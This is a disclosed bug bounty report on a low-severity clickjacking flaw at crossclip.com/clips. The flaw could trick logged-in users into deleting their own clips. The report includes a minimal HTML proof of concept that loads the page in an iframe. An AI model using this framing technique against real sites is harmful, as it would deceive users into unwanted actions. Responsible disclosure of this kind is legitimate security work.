# clickjacking on deleting user's clips [https://crossclip.com/clips]

## Report Details
- **Report ID**: 1294767
- **URL**: https://hackerone.com/reports/1294767
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-08-08T00:02:21.717Z
- **Disclosed**: 2021-11-05T20:39:29.102Z

## Reporter
- **Username**: ibrahimatix0x01
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: logitech

## Vulnerability Information
## Summary:
An attacker can trick  victim to delete his own clips on https://crossclip.com/clips.
## Steps To Reproduce:
{F1403810}
  1. Login
  1. Create an HTML file with the following code.
```
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I-Frame</title>
</head>
<body>
<center><h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>

<iframe src="https://crossclip.com/clips" frameborder="0 px" height="1200px" width="1920px"></iframe>
</center>
</body>
</html>

```
  

## Supporting Material/References:
{F1403810}

## Impact

tricking user to delete his own clips

## Attachments
- POC.webm
